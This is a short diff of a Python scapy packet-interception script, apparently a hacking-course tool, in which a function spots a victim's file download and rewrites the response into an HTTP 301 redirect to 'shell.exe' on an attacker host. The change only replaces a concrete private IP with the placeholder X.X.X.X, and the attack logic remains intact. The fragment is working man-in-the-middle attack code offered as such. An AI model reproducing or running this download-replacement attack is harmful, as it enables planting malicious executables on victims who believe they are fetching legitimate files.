@@ -42,7 +42,7 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file..")
-                http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://10.222.111.228/shell.exe\n\n"
+                http_redirect = "HTTP/1.1 301 Moved Permanently\nLocation: http://X.X.X.X/shell.exe\n\n"
                 modified_packet = set_load(scapy_packet, http_redirect)
                 packet.set_payload(bytes(modified_packet))
     packet.accept()  # Forwards packets
